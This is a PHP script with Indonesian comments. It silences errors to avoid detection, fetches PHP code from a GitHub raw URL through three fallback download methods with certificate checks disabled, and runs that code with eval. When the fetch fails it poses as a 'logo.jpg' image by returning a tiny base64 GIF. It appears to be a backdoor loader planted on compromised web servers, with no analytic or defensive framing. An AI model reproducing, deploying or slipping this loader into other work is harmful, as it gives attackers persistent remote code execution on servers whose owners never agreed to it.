<?php
// Matikan display error untuk menghindari deteksi
error_reporting(0);
@ini_set('display_errors', 0);

// Fungsi untuk mengambil konten URL dengan berbagai metode bypass
function getRemoteContent($url) {
    $content = '';
    
    // Metode 1: cURL dengan opsi bypass lengkap
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.google.com/');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.5',
            'Connection: keep-alive',
            'Cache-Control: max-age=0'
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
    }
    
    // Metode 2: file_get_contents dengan stream context
    if (empty($content) && ini_get('allow_url_fopen')) {
        $opts = [
            'http' => [
                'method' => 'GET',
                'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
                             "Accept: */*\r\n" .
                             "Connection: keep-alive\r\n",
                'timeout' => 10
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true
            ]
        ];
        $context = stream_context_create($opts);
        $content = @file_get_contents($url, false, $context);
    }
    
    // Metode 3: fsockopen untuk koneksi manual
    if (empty($content)) {
        $url_parts = parse_url($url);
        $host = $url_parts['host'];
        $path = isset($url_parts['path']) ? $url_parts['path'] : '/';
        $port = isset($url_parts['port']) ? $url_parts['port'] : 80;
        
        if ($url_parts['scheme'] === 'https') {
            $port = 443;
            $host = 'ssl://' . $host;
        }
        
        $fp = @fsockopen($host, $port, $errno, $errstr, 10);
        if ($fp) {
            $out = "GET $path HTTP/1.1\r\n";
            $out .= "Host: $host\r\n";
            $out .= "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n";
            $out .= "Accept: */*\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite($fp, $out);
            $response = '';
            while (!feof($fp)) {
                $response .= fgets($fp, 128);
            }
            fclose($fp);
            
            // Pisahkan header dan body
            $pos = strpos($response, "\r\n\r\n");
            if ($pos !== false) {
                $content = substr($response, $pos + 4);
            }
        }
    }
    
    return $content;
}

// Ambil kode remote
 $remoteCode = getRemoteContent('https://raw.githubusercontent.com/wawanbangke/ggo/refs/heads/main/func.php');

// Eksekusi kode jika berhasil diambil
if (!empty($remoteCode)) {
    // Hapus tag PHP pembuka/tutup
    $remoteCode = preg_replace('/^<\?php/', '', $remoteCode);
    $remoteCode = preg_replace('/\?>$/', '', $remoteCode);
    
    // Eksekusi kode dan tampilkan outputnya
    eval("?>" . $remoteCode);
    
    // Hentikan eksekusi setelah eval
    exit;
}

// Jika gagal mengambil kode remote, tampilkan gambar palsu
header('Content-Type: image/jpeg');
header('X-Content-Type-Options: nosniff');
header('Content-Disposition: inline; filename="logo.jpg"');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
